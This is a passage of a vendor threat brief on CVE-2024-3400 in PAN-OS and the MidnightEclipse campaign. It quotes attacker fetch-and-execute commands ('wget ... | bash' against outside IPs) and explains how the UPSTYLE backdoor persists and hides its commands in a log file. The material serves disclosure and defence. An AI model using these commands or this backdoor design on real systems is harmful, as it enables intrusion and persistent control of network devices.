    else if(referer == 'Cortex'){
        article.dataset.type = 'cortex';
    }
    else if(referer == 'Sase'){
        article.dataset.type = 'sase';
    }
    else if(referer == 'Unit'){
        article.dataset.type = 'unit';
    }
    else if(referer == 'Ngfw'){
        article.dataset.type = 'ngfw';
    }
    //set class to default
    if(referer == 'Unit' || referer == 'Ngfw'){
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    callMainSitePrismaNavHTML();        
}
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->



<main class="main">
    <section class="section section--article">
        <div class="pa article-banner" style="background-image:url('https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/07_Nation-State-cyberattacks_1920x900.jpg')">
          <div class="l-container"> 
            <div class="l-breadcrumbs"> 
              <ul> <li> <a href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="cve-2024-3400:hero:breadcrumb:Threat Research">Threat Research Center</a></li><li><a href="https://unit42.paloaltonetworks.com/category/top-cyberthreats/" role="link" title="High Profile Threats" data-page-track="true" data-page-track-value="cve-2024-3400:hero:breadcrumb:High Profile Threats">High Profile Threats</a></li><li class="is-current"><a href="https://unit42.paloaltonetworks.com/category/vulnerabilities/" role="link" title="Vulnerabilities" data-page-track="true" data-page-track-value="cve-2024-3400:hero:breadcrumb:Vulnerabilities">Vulnerabilities</a></li> </ul>
            </div>            <div class="ab__title">
              <a class="card-category" href="https://unit42.paloaltonetworks.com/category/vulnerabilities/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:hero:Vulnerabilities"><span class="ab-title__pre">Vulnerabilities</span></a> 
              <h1>Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (Updated May 20)</h1>
              <div class="ab__video">
              <span class="duration"> 
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-clock.svg" alt="Clock Icon"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 12</span> <span class="rt-label rt-postfix"></span></span> min read              </span>
                              </div>          
              <div class="ab-lc__wrapper">
                <span class="ab-title__pre">Related Products</span><div class="ab__link-cards"><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/advanced-threat-prevention/" style="--card-color: #ffcb06" role="link" title="Advanced Threat Prevention" data-page-track="true" data-page-track-value="cve-2024-3400:hero:Advanced Threat Prevention"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png" alt="Advanced Threat Prevention icon">Advanced Threat Prevention</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/cortex-xdr/" style="--card-color: #00cc66" role="link" title="Cortex XDR" data-page-track="true" data-page-track-value="cve-2024-3400:hero:Cortex XDR"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png" alt="Cortex XDR icon">Cortex XDR</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/cortex-xpanse/" style="--card-color: #00cc66" role="link" title="Cortex Xpanse" data-page-track="true" data-page-track-value="cve-2024-3400:hero:Cortex Xpanse"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png" alt="Cortex Xpanse icon">Cortex Xpanse</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/cortex-xsiam/" style="--card-color: #00cc66" role="link" title="Cortex XSIAM" data-page-track="true" data-page-track-value="cve-2024-3400:hero:Cortex XSIAM"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png" alt="Cortex XSIAM icon">Cortex XSIAM</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/managed-threat-hunting/" style="--card-color: #c94727" role="link" title="Managed Threat Hunting" data-page-track="true" data-page-track-value="cve-2024-3400:hero:Managed Threat Hunting"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/unit42_RGB_logo_Icon_Color.png" alt="Managed Threat Hunting icon">Managed Threat Hunting</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/next-generation-firewall/" style="--card-color: #ffcb06" role="link" title="Next-Generation Firewall" data-page-track="true" data-page-track-value="cve-2024-3400:hero:Next-Generation Firewall"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png" alt="Next-Generation Firewall icon">Next-Generation Firewall</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/prisma-access/" style="--card-color: #00c0e8" role="link" title="Prisma Access" data-page-track="true" data-page-track-value="cve-2024-3400:hero:Prisma Access"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/prisma_RGB_logo_Icon_Color.png" alt="Prisma Access icon">Prisma Access</a></div>              </div>
            </div>
          </div>
          <div class="ab__footer">
            <div class="l-container">
              <div class="ab__footer-wrapper">
                <ul class="ab__features" role="list">
                  <li role="listitem">
				 <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-profile-grey.svg" alt="Profile Icon">
					 <div class="ab__text"><span>By:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:Unit 42" href="https://unit42.paloaltonetworks.com/author/unit42/">Unit 42</a></li></ul></div></li>                  <li role="listitem">
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-calendar-grey.svg" alt="Published Icon">
			<div class="ab__text"><span>Published:</span>April 12, 2024</div></li>					<li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-category.svg" alt="Tags Icon"><div class="ab__text"><span>Categories:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:High Profile Threats" href="https://unit42.paloaltonetworks.com/category/top-cyberthreats/">High Profile Threats</a></li><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:Malware" href="https://unit42.paloaltonetworks.com/category/malware/">Malware</a></li><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:Vulnerabilities" href="https://unit42.paloaltonetworks.com/category/vulnerabilities/">Vulnerabilities</a></li></ul></div>
		</li>                  <li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-tags-grey.svg" alt="Tags Icon"><div class="ab__text"><span>Tags:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:backdoor" href="https://unit42.paloaltonetworks.com/tag/backdoor/">Backdoor</a></li><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:Command injection" href="https://unit42.paloaltonetworks.com/tag/command-injection/">Command injection</a></li><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:CVE-2024-3400" href="https://unit42.paloaltonetworks.com/tag/cve-2024-3400/">CVE-2024-3400</a></li><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:MidnightEclipse" href="https://unit42.paloaltonetworks.com/tag/midnighteclipse/">MidnightEclipse</a></li><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:Python" href="https://unit42.paloaltonetworks.com/tag/python/">Python</a></li><li><a data-page-track="true" data-page-track-value="cve-2024-3400:hero:Upstyle" href="https://unit42.paloaltonetworks.com/tag/upstyle/">Upstyle</a></li></ul></div>
		</li>                </ul>
                <div class="ab__options">
                  <ul role="list">
                                        <li role="listitem"><a href="https://unit42.paloaltonetworks.com/cve-2024-3400/?pdf=download&#038;lg=en&#038;_wpnonce=a05dacd8dc" role="link" target="_blank"  title="Click here to download" data-page-track="true" data-page-track-value="cve-2024-3400:hero:pdfdownload"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-download.svg" alt="Download Icon"></a></li>
                    <li role="listitem"><a href="https://unit42.paloaltonetworks.com/cve-2024-3400/?pdf=print&#038;lg=en&#038;_wpnonce=a05dacd8dc" target="_blank" role="link" title="Click here to print" data-page-track="true" data-page-track-value="cve-2024-3400:hero:pdfprint"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-print.svg" alt="Print Icon"></a></li>
                  </ul>
                  
	<div class="ab__share" id="shareDropdown" role="button" aria-expanded="false">
	<a href="#" role="link" title="Click here to share" data-page-track="true" data-page-track-value="cve-2024-3400:share" class="">Share<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"></a><ul class="share-dropdown" role="menu">
				<li role="menuitem">
					<a href="#" class="copy-url" id="copyUrl" data-url="https://unit42.paloaltonetworks.com/cve-2024-3400/" role="link" title="Copy link" data-page-track="true" data-page-track-value="cve-2024-3400:share:link"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-share-link.svg" alt="Link Icon"></a>
				</li>
				<li role="menuitem">
					<a href="mailto:?subject=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020)&#038;body=Check%20out%20this%20article%20https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F" role="link" title="Share in email" data-page-track="true" data-page-track-value="cve-2024-3400:share:email"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-sms.svg" alt="Link Email"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F" target="_blank" role="link" title="Share in Facebook" data-page-track="true" data-page-track-value="cve-2024-3400:share:facebook"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-fb-share.svg" alt="Facebook Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F&#038;title=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020)" target="_blank" role="link" title="Share in LinkedIn" data-page-track="true" data-page-track-value="cve-2024-3400:share:linkedin"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-linkedin-share.svg" alt="LinkedIn Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F&#038;text=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020)" target="_blank" role="link" title="Share in Twitter" data-page-track="true" data-page-track-value="cve-2024-3400:share:twitter"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-twitter-share.svg" alt="Twitter Icon"></a>
				</li>
				<li role="menuitem">
					<a href="//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F" target="_blank" role="link" title="Share in Reddit" data-page-track="true" data-page-track-value="cve-2024-3400:share:reddit"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-reddit-share.svg" alt="Reddit Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://mastodon.social/share?text=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020)%20https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F" target="_blank" role="link" title="Share in Mastodon" data-page-track="true" data-page-track-value="cve-2024-3400:share:mastodon"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-mastodon-share.svg" alt="Mastodon Icon"></a>
				</li>
	  </ul>
    </div>                </div>
              </div>
            </div>
          </div>
        </div>
      </section> 
    <section class="section blog-contents"> 
      <div class="pa blog-editor">
        <div class="l-container">
          <div class="be__wrapper">
            <div class="be__contents">
              <div class="be__contents-wrapper">
                <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/cve-2024-3400/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><h2>Executive Summary</h2>
<p><strong>This threat brief is monitored daily and updated as new intelligence is available for us to share. The full update log is at the end of this post and offers the fullest account of all changes made.</strong></p>
<p>Palo Alto Networks and Unit 42 are engaged in tracking activity related to CVE-2024-3400 and are working with external researchers, partners and customers to share information transparently and rapidly.</p>
<p>A critical command injection vulnerability in Palo Alto Networks PAN-OS software enables an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. The vulnerability, assigned CVE-2024-3400, has a CVSS score of 10.0.</p>
<p><span style="font-weight: 400;">This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both). </span><span style="font-weight: 400;">This issue does not affect cloud firewalls (Cloud NGFW), Panorama appliances or Prisma Access.</span></p>
<p>For up-to-date information about affected products and versions, please refer to the <a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener">Palo Alto Networks Security Advisory</a> on this issue. Additionally, <a href="https://thecyberwire.com/podcasts/threat-vector/21/notes" target="_blank" rel="noopener">episode 21 of the Unit 42 podcast Threat Vector</a> covers the discovery, technical details and exploitation of the vulnerability.</p>
<p>Palo Alto Networks is aware of an increasing number of attacks that leverage the exploitation of this vulnerability. Third parties have disclosed proofs of concept for this vulnerability. We are also aware of a proof of concept including post-exploit persistence techniques that survive resets and upgrades. We are not aware of any malicious attempts to use these persistence techniques in active exploitation of the vulnerability at this time.</p>
<p>We are tracking the initial exploitation of this vulnerability under the name Operation MidnightEclipse.</p>
<p><span style="font-weight: 400;">The section </span><a href="#post-133365-_50343o6a6han"><span style="font-weight: 400;">Current Scope of the Attack</span></a><span style="font-weight: 400;"> includes information on the types of exploitation activity we have seen, as well as their relative prevalence. The vast majority of cases that Unit 42 has responded to have been unsuccessful attempts to exploit the vulnerability and some compromises of PAN-OS that are limited to confirming that the device is exploitable.</span></p>
<p>Other cases have included the following activity:</p>
<ul>
<li>Limited attempts in which a file on the hard drive has been copied to a location accessible via a web request</li>
<li>A very limited number of compromises that led to interactive command execution</li>
</ul>
<p>This threat brief will cover information about the vulnerability and what we know about post-exploitation activity. We will share guidance to mitigate the vulnerability, though readers should also refer to the <a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener">Security Advisory</a> for specific product version information and remediation guidance. We will continue to update this threat brief as more information becomes available.</p>
<p>If you believe your firewall has been compromised, please reach out to <a href="https://support.paloaltonetworks.com/" target="_blank" rel="noopener">Palo Alto Networks support</a>.</p>
<p><span style="font-weight: 400;">This issue is fixed in <a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener">hotfix releases</a> of PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3 and all later PAN-OS versions. Hotfixes for other commonly deployed maintenance releases are also available. Additional guidance on mitigation for customers is available in the <a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener">Security Advisory.</a></span></p>
<p>A Knowledge Base article, <a href="https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK" target="_blank" rel="noopener">How to Remedy CVE-2024-3400</a>, is available in the Customer Support Portal.</p>
<p>As a matter of best practice, Palo Alto Networks recommends that you monitor your network for abnormal activity and investigate any unexpected network activity.</p>
<p>We would like to thank Volexity for finding this issue and their continuing coordination and partnership. <span style="font-weight: 400;">Please reference Volexity’s </span><a href="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400" target="_blank" rel="noopener"><span style="font-weight: 400;">blog</span></a><span style="font-weight: 400;"> for their analysis.</span></p>
<p>Palo Alto Networks customers receive protections from and mitigations for CVE-2024-3400 and malware used in post-exploitation activity in the following ways:</p>
<p><span style="font-weight: 400;">Customers with a Threat Prevention subscription can block attacks for this vulnerability using Threat ID <a href="https://threatvault.paloaltonetworks.com/?query=95187" target="_blank" rel="noopener">95187</a>, <a href="https://threatvault.paloaltonetworks.com/?query=95189" target="_blank" rel="noopener">95189</a> and <a href="https://threatvault.paloaltonetworks.com/?query=95191" target="_blank" rel="noopener">95191</a> (available in Applications and Threats content version 8836-8695 and later). </span><a href="https://security.paloaltonetworks.com/CVE-2024-3400"><span style="font-weight: 400;">Our advisory has been updated</span></a><span style="font-weight: 400;"> with new Threat Prevention content updates for additional Threat Prevention IDs around CVE-2024-3400.</span></p>
<p><span style="font-weight: 400;">To apply the Threat IDs, customers must ensure that vulnerability protection has been applied to their GlobalProtect interface to prevent exploitation of this issue on their device. </span>Please see the relevant <a href="https://live.paloaltonetworks.com/t5/globalprotect-articles/applying-vulnerability-protection-to-globalprotect-interfaces/ta-p/340184" target="_blank" rel="noopener">LIVEcommunity article</a> for more information.</p>
<p>The <a href="#post-133365-_vgezw6a4uez">Managed Threat Hunting</a> section below includes XQL queries that can be used to search for signs of exploitation of this CVE.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td><b>Vulnerabilities Discussed</b></td>
<td><a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener"><span style="font-weight: 400;">CVE-2024-3400</span></a></td>
</tr>
</tbody>
</table>
<h2>Details of the Vulnerability</h2>
<p><span style="font-weight: 400;">A command injection vulnerability in Palo Alto Networks PAN-OS software enables an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both). </span></p>
<p>Palo Alto Networks is aware of targeted attacks that leverage this vulnerability. The next section covers details of the post-exploitation activity we’ve observed.</p>
<h2><a id="post-133365-_50343o6a6han"></a>Current Scope of the Attack</h2>
<p>Palo Alto Networks has classified observations of attempted exploitation into several levels, from Level 0 to Level 3. In all cases we recommend following the guidance in the <a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener">Security Advisory</a>.</p>
<p><strong>Level 0: Probe <span style="font-weight: 400;">– </span></strong>An unsuccessful exploitation attempt. Forensic artifacts indicate that the attempt was made to access the customer network, but the attacker did not actually succeed. Palo Alto Networks assesses there is likely <em>little to no</em> immediate impact of a Level 0 attempt.</p>
<p><strong>Level 1: Test</strong> <strong><span style="font-weight: 400;">– The vulnerability was being tested on the device. A 0-byte file has been created and is resident on the firewall. However, there is no indication of any known unauthorized command execution.</span></strong></p>
<p><strong>Level 2: Potential Exfiltration <span style="font-weight: 400;">– </span></strong>A file on the device has been copied to a location accessible via a web request, though the file may or may not have been subsequently downloaded. Typically, the file we have observed being copied is <span style="font-family: 'courier new', courier, monospace;">running_config.xml</span>.</p>
<p><strong>Level 3: Interactive Access</strong> <strong><span style="font-weight: 400;">–</span></strong> There are signs of interactive command execution. This may include shell-based backdoors, introduction of code, downloading files or running commands.</p>
<p>It is important to note that <em>the vast majority of cases that Unit 42 has responded to have been unsuccessful attempts to exploit the vulnerability and some Level 1 compromises of PAN-OS</em>. Other cases have included limited Level 2 and very limited Level 3 compromises of those targeted firewalls.</p>
<h2><a id="midnightupstylecronjob"></a>UPSTYLE and Cron Job Backdoor Activity</h2>
<p>As part of the activity observed in Operation MidnightEclipse, the threat actor exploited CVE-2024-3400 to run commands on the firewall. We have determined that the threat actor initially intended to install a Python-based backdoor, which our colleagues at Volexity referred to as UPSTYLE.</p>
<p>We believe the threat actors created UPSTYLE specifically for this campaign. However, the threat actors were unsuccessful at installing UPSTYLE after three different exploit attempts. After the third failed attempt, the threat actor decided to install a cron job backdoor to carry out their post-exploitation activities.</p>
<p>After failing to install UPSTYLE, the threat actor was observed exploiting CVE-2024-3400 to run a handful of the commands on the firewall. The commands included copying configuration files to the web application folder and exfiltrating them via HTTP requests to those files.</p>
<p>The following IP address was seen attempting to access a specific configuration file copied to this folder, which we believe is a VPN used by the threat actor:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">66.235.168[.]222</span></li>
</ul>
<p>After gathering configuration files, the threat actor exploited the vulnerability to run the following command to receive additional commands from an external server in the form of a bash script:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">wget -qO- hxxp://172.233.228[.]93/patch|bash</span></li>
</ul>
<p>We were unable to access the bash script hosted at this URL. However, shortly after we saw evidence of the creation of a cron job. This cron job would run every minute to access commands hosted on the same external server that would execute via bash, as seen in the following command:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">wget -qO- hxxp://172.233.228[.]93/policy | bash</span></li>
</ul>
<p>We were unable to access the commands executed via this URL, but we believe this cron job-based backdoor was used to carry out the actor’s post-exploitation activities.</p>
<p>While the threat actors were unable to install the UPSTYLE backdoor, it appears that they created it specifically for this campaign and planned on using it as the initial backdoor. Also, the reason the actors failed to install UPSTYLE included mistakes in the exploit attempts themselves, as well as trivial mistakes in the executed commands. While we have not seen UPSTYLE used in any other exploit attempts, it is possible that UPSTYLE could have been successfully installed on other devices.</p>
<p>As previously mentioned, the threat actors attempted three unsuccessful exploit attempts to run commands to install UPSTYLE. For two of these attempts, UPSTYLE was hosted at <span style="font-family: 'courier new', courier, monospace;">hxxp://144.172.79[.]92/update.py</span>.</p>
<p>In the third exploit attempt, we saw the actor hosting the backdoor at <span style="font-family: 'courier new', courier, monospace;">nhdata.s3-us-west-2.amazonaws[.]com</span>, which may suggest that the actors thought network-based protections caused the first two failed installation attempts. According to the following HTTP headers, it appears that the threat actor last modified UPSTYLE hosted at <span style="font-family: 'courier new', courier, monospace;">144.172.79[.]92</span> on April 7, 2024:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67820bbfc6caf346966087" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Accept-Ranges: bytes
Content-Length: 5187
Content-Type: application/octet-stream
Date: Thu, 11 Apr 2024 16:12:16 GMT
Etag: "6612443d-1443"
Last-Modified: Sun, 07 Apr 2024 06:59:09 GMT
Server: nginx/1.18.0 (Ubuntu)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67820bbfc6caf346966087-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6caf346966087-2">2</div><div class="crayon-num" data-line="crayon-67820bbfc6caf346966087-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6caf346966087-4">4</div><div class="crayon-num" data-line="crayon-67820bbfc6caf346966087-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-67820bbfc6caf346966087-6">6</div><div class="crayon-num" data-line="crayon-67820bbfc6caf346966087-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67820bbfc6caf346966087-1"><span class="crayon-i">Accept</span>-<span class="crayon-i">Ranges</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-e">bytes</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6caf346966087-2"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">5187</span></div><div class="crayon-line" id="crayon-67820bbfc6caf346966087-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">octet</span>-<span class="crayon-e">stream</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6caf346966087-4"><span class="crayon-i">Date</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Thu</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-h"> </span><span class="crayon-i">Apr</span><span class="crayon-h"> </span><span class="crayon-cn">2024</span><span class="crayon-h"> </span><span class="crayon-cn">16</span><span class="crayon-sy">:</span><span class="crayon-cn">12</span><span class="crayon-sy">:</span><span class="crayon-cn">16</span><span class="crayon-h"> </span><span class="crayon-e">GMT</span></div><div class="crayon-line" id="crayon-67820bbfc6caf346966087-5"><span class="crayon-i">Etag</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-s">"6612443d-1443"</span></div><div class="crayon-line crayon-striped-line" id="crayon-67820bbfc6caf346966087-6"><span class="crayon-i">Last</span>-<span class="crayon-i">Modified</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Sun</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">07</span><span class="crayon-h"> </span><span class="crayon-i">Apr</span><span class="crayon-h"> </span><span class="crayon-cn">2024</span><span class="crayon-h"> </span><span class="crayon-cn">06</span><span class="crayon-sy">:</span><span class="crayon-cn">59</span><span class="crayon-sy">:</span><span class="crayon-cn">09</span><span class="crayon-h"> </span><span class="crayon-e">GMT</span></div><div class="crayon-line" id="crayon-67820bbfc6caf346966087-7"><span class="crayon-i">Server</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">nginx</span>/<span class="crayon-cn">1.18.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">Ubuntu</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The <span style="font-family: 'courier new', courier, monospace;">update.py</span> file hosted at <span style="font-family: 'courier new', courier, monospace;">144.172.79[.]92</span> has a SHA256 value of <span style="font-family: 'courier new', courier, monospace;">3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac</span>. This file is a backdoor that has multiple layers.</p>
<p>First, <span style="font-family: 'courier new', courier, monospace;">update.py</span> writes another Python script to the following location:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">[snip]/site-packages/system.pth</span></li>
</ul>
<p>The Python script written to <span style="font-family: 'courier new', courier, monospace;">system.pth</span> Base64-decodes an embedded Python script and executes it. This embedded Python script has two functions named <span style="font-family: 'courier new', courier, monospace;">protect</span> and <span style="font-family: 'courier new', courier, monospace;">check</span>, which are called in that order.</p>
<p>The protect function sends a SIGTERM signal and writes the contents of the <span style="font-family: 'courier new', courier, monospace;">system.pth</span> file back to itself, likely as a persistence mechanism. The check function will read <span style="font-family: 'courier new', courier, monospace;">/proc/self/cmdline</span> to see if it is running as <span style="font-family: 'courier new', courier, monospace;">monitor mp</span> before running another Base64 embedded Python script, which is the functional backdoor.</p>
<p>The Python script run by <span style="font-family: 'courier new', courier, monospace;">system.pth</span> has a function named <span style="font-family: 'courier new', courier, monospace;">__main</span> that will run in a thread. This function first reads the contents of the following file, along with its access and modified times:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">[snip]/css/bootstrap.min.css</span></li>
</ul>
<p>It then enters an infinite loop that iterates once every two seconds, reading in the following file:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">[snip]/sslvpn_ngx_error.log</span></li>
</ul>
<p>The script will then iterate through each line of the file and search the line for the threat actor's command using the following regular expression:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">img\[([a-zA-Z0-9+/=]+)\]</span></li>
</ul>
<p>If the above regular expression matches, the script will Base64-encode the contents of the command and run it using the <span style="font-family: 'courier new', courier, monospace;">popen</span> method within Python's OS module. The lines of the <span style="font-family: 'courier new', courier, monospace;">sslvpn_ngx_error.log</span> file that do not match the regular expression are written back to the file, which essentially prunes the lines that contain commands from persisting in the <span style="font-family: 'courier new', courier, monospace;">sslvpn_ngx_error.log</span> file for later analysis.</p>
<p>After running the command, the script writes the output of the command to the following file:</p>
<ul>
